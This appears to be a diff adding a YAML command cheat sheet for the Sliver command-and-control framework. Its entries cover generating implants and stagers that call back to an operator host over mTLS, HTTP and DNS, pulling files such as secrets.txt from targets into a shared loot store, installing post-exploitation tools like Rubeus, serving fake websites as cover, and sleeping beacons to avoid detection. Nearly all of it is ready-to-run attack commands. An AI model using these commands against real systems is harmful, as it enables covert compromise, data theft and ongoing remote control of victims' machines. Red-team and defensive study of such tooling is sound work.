+    command: "sliver > generate stager --lhost {{lhost|192.168.122.1}} --lport {{lport|1234}} --protocol {{protocol|http}} --save {{output_dir|/tmp}}"
+
+  # ============================================================================
+  # LOOT
+  # ============================================================================
+
+  - title: sliver - add remote file to loot
+    desc: |
+      Download a file from the target and add it to the loot store. The file is
+      stored server-side and shared among all operators in multiplayer mode.
+      Useful for centralizing collected data.
+    command: "sliver (SESSION_NAME) > loot remote {{remote_path|C:\\Users\\Desktop\\secrets.txt}}"
+
+  - title: sliver - add local file to loot
+    desc: |
+      Add a file from the local machine to the loot store. The file is uploaded
+      to the server and stored in the loot database. Useful for storing tools,
+      scripts, or other files server-side.
+    command: "sliver > loot local {{local_path|/tmp/credentials.txt}}"
+
+  - title: sliver - fetch loot
+    desc: |
+      Fetch and view loot from the loot store. Presents an interactive menu to
+      select loot items. Textual loot is displayed directly, file loot can be
+      saved to a local file.
+    command: "sliver > loot fetch"
+
+  - title: sliver - list all loot
+    desc: |
+      List all items in the loot store. Shows loot ID, type, name, size, and
+      other metadata. Useful for browsing collected loot or finding specific items.
+    command: "sliver > loot"
+
+  - title: sliver - remove loot
+    desc: |
+      Remove an item from the loot store by ID. Permanently deletes the loot item
+      from the server database. Use 'loot' command to see loot IDs.
+    command: "sliver > loot rm {{loot_id|1}}"
+
+  # ============================================================================
+  # ARMORY & EXTENSIONS
+  # ============================================================================
+
+  - title: sliver - list armory packages
+    desc: |
+      List all available packages in the armory. Shows package names, types (alias
+      or extension), versions, and descriptions. Packages include BOFs, .NET tools,
+      and other third-party tools.
+    command: "sliver > armory"
+
+  - title: sliver - install armory package
+    desc: |
+      Install a package from the armory. Packages are downloaded from GitHub and
+      installed client-side. Each operator must install packages individually.
+      Packages are cryptographically signed by Sliver authors.
+    command: "sliver > armory install {{package_name|rubeus}}"
+
+  - title: sliver - install all armory packages
+    desc: |
+      Install all available packages from the armory. Downloads and installs every
+      package. Useful for setting up a complete toolset, but may take some time.
+    command: "sliver > armory install all"
+
+  - title: sliver - update armory packages
+    desc: |
+      Update all installed armory packages to the latest versions. Checks for
+      updates and installs newer versions if available. Keeps your tools up to date.
+    command: "sliver > armory update"
+
+  - title: sliver - list installed aliases
+    desc: |
+      List all installed aliases. Aliases are command wrappers for external tools
+      (e.g., Rubeus, SharpHound). Shows alias names and versions.
+    command: "sliver > aliases"
+
+  - title: sliver - list installed extensions
+    desc: |
+      List all installed extensions. Extensions add new functionality to Sliver
+      (e.g., BOF loader, COFF support). Shows extension names and versions.
+    command: "sliver > extensions"
+
+  - title: sliver - remove alias
+    desc: |
+      Remove an installed alias by name. Uninstalls the alias from the client.
+      The alias files are stored in ~/.sliver-client/ and can be manually deleted.
+    command: "sliver > aliases rm {{alias_name|rubeus}}"
+
+  - title: sliver - remove extension
+    desc: |
+      Remove an installed extension by name. Uninstalls the extension from the
+      client. Extensions are stored in ~/.sliver-client/ and can be manually deleted.
+    command: "sliver > extensions rm {{extension_name|coff-loader}}"
+
+  - title: sliver - load local extension
+    desc: |
+      Load a locally developed extension. Extensions must have an extension.json
+      manifest file. Local extensions don't need to be cryptographically signed.
+      Useful for custom BOFs or tools.
+    command: "sliver > extensions load {{extension_path|/path/to/extension}}"
+
+  # ============================================================================
+  # PROFILES
+  # ============================================================================
+
+  - title: sliver - create new profile
+    desc: |
+      Create a new implant profile. Profiles are blueprints that define implant
+      configuration to be reused. Useful for standardizing implant generation
+      or for staging configurations.
+    command: "sliver > profiles new --mtls {{domain|example.com}} --os {{os|windows}} --arch {{arch|amd64}} {{profile_name|win-mtls}}"
+
+  - title: sliver - list profiles
+    desc: |
+      List all saved profiles. Shows profile names, platforms, C2 configurations,
+      debug status, format, obfuscation settings, and limitations.
+    command: "sliver > profiles"
+
+  - title: sliver - generate from profile
+    desc: |
+      Generate an implant using a saved profile. Uses all settings from the profile.
+      Can override profile settings with additional flags if needed.
+    command: "sliver > generate --profile {{profile_name|win-mtls}} --save {{output_dir|/tmp}}"
+
+  # ============================================================================
+  # MULTIPLAYER MODE
+  # ============================================================================
+
+  - title: sliver - create new operator
+    desc: |
+      Create a new operator configuration file for multiplayer mode. Generates client
+      certificate and config file. The config file allows the operator to connect
+      to the server. Specify operator name and server IP (--lhost).
+    command: "sliver > new-operator --name {{operator_name|moloch}} --lhost {{server_ip|1.2.3.4}}"
+
+  - title: sliver - start multiplayer listener
+    desc: |
+      Start the multiplayer RPC listener. Allows multiple operators to connect
+      to the server simultaneously. Default port is TCP 31337. Must be running for
+      clients to connect.
+    command: "sliver > multiplayer"
+
+  - title: sliver - start multiplayer listener on custom port
+    desc: |
+      Start the multiplayer listener on a custom port. Useful when default port
+      31337 is blocked or you need multiple servers. Ensure firewall allows the port.
+    command: "sliver > multiplayer --lport {{port|31338}}"
+
+  - title: sliver - import operator config (client)
+    desc: |
+      Import an operator configuration file on the client. The config file is copied
+      to ~/.sliver-client/configs/. Client can then select the server when starting.
+    command: "sliver-client import {{config_file|./operator.cfg}}"
+
+  # ============================================================================
+  # ADVANCED C2 OPTIONS
+  # ============================================================================
+
+  - title: sliver - generate HTTP with URL prefix
+    desc: |
+      Generate an HTTP implant with URL path prefix. All C2 requests will prepend
+      the specified path. Useful for HTTP redirectors or when you need specific
+      URL structures.
+    command: "sliver > generate --http {{domain|example.com}}/{{path_prefix|foo/bar}} --save {{output_dir|/tmp}}"
+
+  - title: sliver - generate HTTP with advanced options
+    desc: |
+      Generate an HTTP implant with advanced C2 options. Options are passed as URL
+      encoded parameters. Example options: driver=wininet, proxy=http://proxy:8080,
+      host-header for domain fronting, etc.
+    command: "sliver > generate --http {{domain|example.com}}?{{options|driver=wininet}} --save {{output_dir|/tmp}}"
+
+  - title: sliver - generate HTTP with proxy
+    desc: |
+      Generate an HTTP implant with proxy configuration. The implant will use the
+      specified proxy for all C2 traffic. Format: proxy=http://proxy.example.com:8080.
+      Only works with Go HTTP driver.
+    command: "sliver > generate --http {{domain|example.com}}?proxy={{proxy_url|http://proxy.example.com:8080}} --save {{output_dir|/tmp}}"
+
+  - title: sliver - generate HTTP with proxy credentials
+    desc: |
+      Generate an HTTP implant with proxy authentication. Specify proxy URL and
+      credentials. Format: proxy=http://proxy:8080&proxy-username=user&proxy-password=pass.
+      Only works with Go HTTP driver.
+    command: "sliver > generate --http {{domain|example.com}}?proxy={{proxy_url|http://proxy:8080}}&proxy-username={{username|user}}&proxy-password={{password|pass}} --save {{output_dir|/tmp}}"
+
+  - title: sliver - generate HTTP with wininet driver (Windows)
+    desc: |
+      Generate an HTTP implant using Windows wininet driver. Supports NTLM/Kerberos
+      proxy authentication. Less stable than Go driver but necessary for NTLM/Kerberos.
+      Only works on Windows implants.
+    command: "sliver > generate --http {{domain|example.com}}?driver=wininet --os windows --save {{output_dir|/tmp}}"
+
+  - title: sliver - generate DNS with advanced options
+    desc: |
+      Generate a DNS implant with advanced C2 options. Options include: timeout,
+      retry-wait, retry-count, workers-per-resolver, max-errors, force-base32,
+      resolvers, etc. Pass as URL encoded parameters.
+    command: "sliver > generate --dns {{fqdn|1.example.com.}}?{{options|timeout=30s&retry-count=3}} --save {{output_dir|/tmp}}"
+
+  - title: sliver - generate DNS with custom resolvers
+    desc: |
+      Generate a DNS implant with custom DNS resolvers. Forces the implant to use
+      specific DNS servers. Multiple resolvers separated by +. Format: resolvers=1.1.1.1+9.9.9.9.
+    command: "sliver > generate --dns {{fqdn|1.example.com.}}?resolvers={{resolvers|1.1.1.1+9.9.9.9}} --save {{output_dir|/tmp}}"
+
+  # ============================================================================
+  # WEBSITES & STATIC CONTENT
+  # ============================================================================
+
+  - title: sliver - add website content
+    desc: |
+      Add static content to a website. Websites make HTTP(S) listeners look legitimate
+      by serving fake content. Content is key-value pairs of paths and file contents.
+      Useful for blending in with normal web traffic.
+    command: "sliver > websites --website {{website_name|fake-blog}} --web-path {{path|/}} --content {{content_path|./index.html}} add"
+
+  - title: sliver - list websites
+    desc: |
+      List all configured websites. Shows website names and associated content.
+      Websites can be used with HTTP(S) listeners via --website flag.
+    command: "sliver > websites"
+
+  - title: sliver - remove website
+    desc: |
+      Remove a website by name. Deletes the website configuration and all its
+      content. Use 'websites' command to see website names.
+    command: "sliver > websites --website {{website_name|fake-blog}} rm"
+
+  # ============================================================================
+  # CANARIES
+  # ============================================================================
+
+  - title: sliver - list canaries
+    desc: |
+      List all generated canary domains. Canaries are unique per-binary domains
+      that are deliberately not obfuscated. If resolved, indicate the binary
+      was discovered by blue team.
+    command: "sliver > canaries"
+
+  # ============================================================================
+  # SYSTEM & UTILITIES
+  # ============================================================================
+
+  - title: sliver - get system info
+    desc: |
+      Get detailed system information from the target. Shows OS version, architecture,
+      hostname, username, process information, and more. Useful for initial enumeration.
+    command: "sliver (SESSION_NAME) > info"
+
+  - title: sliver - check implant privileges
+    desc: |
+      Check if the implant is running with elevated privileges. On Windows, checks
+      for Administrator/System privileges. On Unix, checks for root/UID 0.
+    command: "sliver (SESSION_NAME) > getprivs"
+
+  - title: sliver - sleep implant
+    desc: |
+      Put the implant to sleep (beacon mode only). Stops check-ins for the specified
+      duration. Useful for avoiding detection during quiet periods. Format: 30s, 5m, 1h.
+    command: "sliver (BEACON_NAME) > sleep {{duration|1h}}"
+
+  - title: sliver - set implant reconnect interval
+    desc: |
+      Set the reconnect interval for session mode implants. How long to wait between
+      reconnection attempts if connection is lost. Default is 60s. Format: 30s, 5m.
+    command: "sliver > generate --mtls {{domain|example.com}} --reconnect {{interval|30s}} --save {{output_dir|/tmp}}"
+
+  - title: sliver - set max connection errors
+    desc: |
+      Set maximum connection errors before implant terminates. After this many
+      consecutive connection failures, the implant will exit. Default is 1000.
+      Useful for limiting retry attempts.
+    command: "sliver > generate --mtls {{domain|example.com}} --max-errors {{max|100}} --save {{output_dir|/tmp}}"
+
+  - title: sliver - kill session
+    desc: |
+      Kill an active session. Terminates the implant process on the target. Use
+      with caution as this will disconnect you from the target. The implant will
+      exit and stop running.
+    command: "sliver (SESSION_NAME) > exit"
+
+  - title: sliver - kill beacon
+    desc: |
+      Kill an active beacon. Terminates the beacon process on the target. The beacon
+      will stop checking in and the implant will exit. Use with caution.
+    command: "sliver (BEACON_NAME) > exit"
+
